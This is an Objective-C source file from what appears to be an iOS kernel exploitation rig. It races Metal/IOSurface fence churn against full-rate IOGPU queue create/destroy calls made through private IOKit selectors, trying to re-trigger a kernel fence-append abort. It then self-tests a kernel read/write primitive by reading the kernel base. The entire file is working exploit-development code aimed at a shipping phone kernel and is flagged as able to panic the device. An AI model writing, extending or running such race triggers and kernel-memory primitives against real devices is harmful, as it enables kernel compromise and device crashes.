//
//  P128FenceRace.m — fence churn x IOGPU queue churn, concurrent. p128.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Provenance: notes 288/289. The twice-aborted fence-append (0x984faf8,
//  abort PC 0x984fcc8, OUR sids in x5) fired while fence teardown ran
//  under allocator churn. p127 (fence churn ALONE, 3 taps ~21k commits
//  each, ~670 recycles each) = clean. This tap runs the co-driver pair:
//
//    thread A: IOSurface-backed Metal blit churn + surface recycle
//              (p127 body — fence teardown, drain walker 0x985c5fc,
//              append 0x984faf8 exercised via engine fences)
//    thread B: P040-ABI IOGPU QueueCreate/destroy ping-pong at full rate
//              (p121 closer shape — the same device-conn/queue allocator
//              family the fill lane hammered)
//
//  The honest surrogate note: the historical co-driver was the ANE fill
//  staging (sids 759..986); threads here are the fence-side + queue-side
//  allocator pair. If A x B is clean across the ladder, the ANE-fill
//  co-driver stays the open P129 question.
//
//  Bounded 12s wall clock. PANIC-POSSIBLE. One tap per force-quit.
//

#import "P128FenceRace.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabIOGPUQueue.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P128_BUILD   @"p128-fencerace-v1"
#define P128_TIME    12.0
#define P128_SURF_W  64
#define P128_SURF_H  64
#define P128_RECYCLE 8         /* fence thread recycles (faster than p127) */

typedef mach_port_t p_ioobject_t;
typedef p_ioobject_t p_ioservice_t;
typedef mach_port_t p_ioconnect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef p_ioservice_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOObjectRelease_t)(p_ioobject_t);
typedef kern_return_t (*IOServiceCS_t)(p_ioconnect_t);
typedef kern_return_t (*IOServiceOpen_t)(p_ioservice_t, task_port_t, uint32_t, p_ioconnect_t *);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(void *);

static NSString *P128R(void);

/* ---- log ------------------------------------------------------------- */
static NSMutableString *g_buf;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

/* ---- shared state ---------------------------------------------------- */
static atomic_int g_stop;
static atomic_ulong ga_rounds, ga_commits, ga_recycles, ga_fails;
static atomic_ulong gb_cr_ok, gb_dr_ok, gb_cr_fail, gb_dr_fail;
static CFMutableDictionaryRef g_dict;
static IOSurfaceCreate_t  g_surfCreate;
static IOSurfaceGetID_t   g_surfID;
static IOConnectCallMethod_t gp_call;
static p_ioconnect_t g_conn;
static uint32_t g_ins, g_dsel, g_typeId;

static void p128_law_dict(void) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t w = P128_SURF_W, h = P128_SURF_H, bpe = 4,
            bpr = P128_SURF_W * 4, as = P128_SURF_W * P128_SURF_H * 4;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);
    CFNumberRef ne = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
    CFNumberRef nr = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpr);
    CFNumberRef na = CFNumberCreate(NULL, kCFNumberSInt32Type, &as);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), ne);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), nr);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), na);
    CFRelease(nw); CFRelease(nh); CFRelease(ne); CFRelease(nr); CFRelease(na);
    g_dict = d;
}

static kern_return_t p128_destroy_one(uint64_t qid);

/* ---- thread A: fence churn (the p127 body) --------------------------- */
static void *p128_fencer(void *u) {
    (void)u;
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) { atomic_fetch_add(&ga_fails, 1); return NULL; }

    MTLTextureDescriptor *td =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:
         MTLPixelFormatBGRA8Unorm width:P128_SURF_W height:P128_SURF_H
         mipmapped:NO];
    td.storageMode = MTLStorageModeShared;

    unsigned long r = 0;
    void *surfaces[2] = { NULL, NULL };
    id<MTLTexture> tex[2] = { NULL, NULL };

    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            if (r % P128_RECYCLE == 0) {
                for (int k = 0; k < 2; k++) {
                    if (tex[k]) tex[k] = NULL;
                    if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
                }
                for (int k = 0; k < 2; k++) {
                    void *s = g_surfCreate(g_dict);
                    if (!s) { atomic_fetch_add(&ga_fails, 1); continue; }
                    tex[k] = [dev newTextureWithDescriptor:td
                                                 iosurface:(IOSurfaceRef)s
                                                     plane:0];
                    surfaces[k] = s;
                    if (!tex[k]) atomic_fetch_add(&ga_fails, 1);
                }
                atomic_fetch_add(&ga_recycles, 1);
            }
            if (!tex[0] || !tex[1]) { r++;
              [NSThread sleepForTimeInterval:0.01]; continue; }
            id<MTLCommandBuffer> cb = [q commandBuffer];
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
               sourceOrigin:MTLOriginMake(0,0,0)
               sourceSize:MTLSizeMake(P128_SURF_W, P128_SURF_H, 1)
               toTexture:tex[1] destinationSlice:0 destinationLevel:0
               destinationOrigin:MTLOriginMake(0,0,0)];
            [e endEncoding];
            [cb commit];
            [cb waitUntilCompleted];
            atomic_fetch_add(&ga_commits, 1);
            r++;
            atomic_store(&ga_rounds, r);
        }
    }
    /* teardown AFTER stop: the delayed-window exercise */
    for (int k = 0; k < 2; k++) {
        if (tex[k]) tex[k] = NULL;
        if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
    }
    return NULL;
}

/* ---- thread B: the queue ping-pong (p121 closer shape) ---------------- */
static void *p128_queuer(void *u) {
    (void)u;
    while (!atomic_load(&g_stop)) {
        uint64_t w0 = 0, w1 = 0; size_t osz = 16;
        kern_return_t cr = [LabIOGPUQueue createWithCall:gp_call conn:g_conn
                                                  typeId:g_typeId inSize:g_ins
                                                  word0:&w0 word1:&w1 outCnt:&osz];
        if (cr != 0) { atomic_fetch_add(&gb_cr_fail, 1); usleep(200); continue; }
        atomic_fetch_add(&gb_cr_ok, 1);
        kern_return_t dr = p128_destroy_one(w0);
        if (dr == 0) atomic_fetch_add(&gb_dr_ok, 1);
        else atomic_fetch_add(&gb_dr_fail, 1);
        /* p121 law: full-rate, no sleep. The double-destroy shape stays
         * P121-only - not fired here. */
    }
    return NULL;
}

static kern_return_t p128_destroy_one(uint64_t qid) {
    uint64_t dsc[] = { qid };
    return gp_call(g_conn, g_dsel, dsc, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

static void p128_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p128", arms, 1, &sr, 0, "p128 auto-learn", "ok",
                      "survived", attr, sizeof attr);
    LabBanditRecord("p128", 0, outcome);
}

@implementation P128FenceRace

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p128_fencerace_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p128 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P128_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] co-driver race: fence churn (p127 = clean ALONE) x IOGPU");
    L(@"  queue churn (the allocator family the fill lane hammered).");
    L(@"  PANIC-POSSIBLE; one tap per force-quit; kread32 = the only gate.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p128"];
    if (stop) { L(stop); p128_bandit("gated"); return P128R(); }

    /* ---- dlsym + dlopen ---- */
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosf  = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosf) { L(@"[-] STOP dlopen"); p128_bandit("nodlopen"); return P128R(); }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    gp_call = dlsym(iokit, "IOConnectCallMethod");
    g_surfCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    g_surfID     = (IOSurfaceGetID_t)dlsym(iosf, "IOSurfaceGetID");
    if (!pMatching || !pGet || !pRelease || !pOpen || !gp_call ||
        !pMainPort || !g_surfCreate || !g_surfID) {
        L(@"[-] STOP dlsym"); p128_bandit("nodlsym"); return P128R();
    }
    p128_law_dict();

    /* ---- the IOGPU conn (p121 shape) ---- */
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *(*pDevCreate)(p_ioservice_t) = dlsym(iogpu, "IOGPUDeviceCreate");
    uint32_t (*pGetConn)(void *) = dlsym(iogpu, "IOGPUDeviceGetConnect");
    void (*pDevRelease)(void *) = dlsym(iogpu, "IOGPUDeviceRelease");
    p_ioservice_t svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) { L(@"[-] STOP no IOGPU service"); p128_bandit("nosvc"); return P128R(); }
    void *dev = pDevCreate ? pDevCreate(svc) : NULL;
    p_ioconnect_t conn = MACH_PORT_NULL;
    if (dev && pGetConn) conn = (p_ioconnect_t)pGetConn(dev);
    if (!conn || conn == MACH_PORT_NULL) {
        kern_return_t okr = pOpen(svc, mach_task_self(), 1, &conn);
        Lf(@"[*] IOServiceOpen type=1 kr=0x%08x", (unsigned)okr);
        if (okr != 0) conn = MACH_PORT_NULL;
    }
    if (!conn || conn == MACH_PORT_NULL) {
        L(@"[-] STOP no conn"); pRelease(svc); p128_bandit("noconn"); return P128R();
    }
    g_conn = conn;
    g_ins = [LabDeviceProfile queueCreateSize];
    g_dsel = [LabDeviceProfile queueDestroySel];
    g_typeId = dev ? (*(uint32_t *)((uint8_t *)dev + 0x08) & 0xff) : 0;

    /* ---- stage 0: BOTH sides calibrate ---- */
    L(@"--- Stage 0: both sides calibrate ---");
    uint64_t w0 = 0, w1 = 0; size_t osz = 16;
    kern_return_t cr = [LabIOGPUQueue createWithCall:gp_call conn:conn
                                              typeId:g_typeId inSize:g_ins
                                              word0:&w0 word1:&w1 outCnt:&osz];
    kern_return_t dr = 0;
    if (cr == 0) { dr = p128_destroy_one(w0); }
    void *s0 = g_surfCreate(g_dict);
    BOOL fc0 = s0 != NULL;
    if (s0) CFRelease(s0);
    if (cr != 0 || dr != 0 || !fc0) {
        Lf(@"[-] calibrate FAIL: qkr=0x%08x dkr=0x%08x fence-create=%@ - honest stop",
           (unsigned)cr, (unsigned)dr, fc0 ? @"OK" : @"FAIL");
        p128_bandit("calibrate-fail"); return P128R();
    }
    L(@"[0] both sides calibrated on THIS device.");

    /* ---- stage 1: the race ---- */
    L(@"--- Stage 1: fence x queue race (bounded 12s) ---");
    L(@"[IN FLIGHT] race begins - one tap per force-quit.");
    atomic_store(&g_stop, 0);
    pthread_t ta, tb;
    pthread_create(&ta, NULL, p128_fencer, NULL);
    pthread_create(&tb, NULL, p128_queuer, NULL);
    for (double t = 0; t < P128_TIME; t += 1.0) {
        [NSThread sleepForTimeInterval:1.0];
        Lf(@"  [t=%0.0fs] fence: comm=%lu recy=%lu fail=%lu | queue: "
           @"cr_ok=%lu dr_ok=%lu cr_fail=%lu dr_fail=%lu",
           t, (unsigned long)atomic_load(&ga_commits),
           (unsigned long)atomic_load(&ga_recycles),
           (unsigned long)atomic_load(&ga_fails),
           (unsigned long)atomic_load(&gb_cr_ok),
           (unsigned long)atomic_load(&gb_dr_ok),
           (unsigned long)atomic_load(&gb_cr_fail),
           (unsigned long)atomic_load(&gb_dr_fail));
    }
    atomic_store(&g_stop, 1);
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);
    Lf(@"  race summary: fence rounds=%lu commits=%lu recycles=%lu "
       @"fails=%lu | queue create_ok=%lu destroy_ok=%lu create_fail=%lu "
       @"destroy_fail=%lu | survived=YES in-tap",
       (unsigned long)atomic_load(&ga_rounds),
       (unsigned long)atomic_load(&ga_commits),
       (unsigned long)atomic_load(&ga_recycles),
       (unsigned long)atomic_load(&ga_fails),
       (unsigned long)atomic_load(&gb_cr_ok),
       (unsigned long)atomic_load(&gb_dr_ok),
       (unsigned long)atomic_load(&gb_cr_fail),
       (unsigned long)atomic_load(&gb_dr_fail));
    if (dev) pDevRelease(dev);
    pRelease(svc);

    /* ---- stage 2: the honest KRW self-test ---- */
    L(@"--- Stage 2 KRW SELF-TEST (honest gate) ---");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this tap. Honest.");
        p128_bandit("lane-closed");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)", kb);
            p128_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p128_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    Lf(@"=== p128 end %@ ===", LabLocalMilitaryNow());
    return P128R();
}

static NSString *P128R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end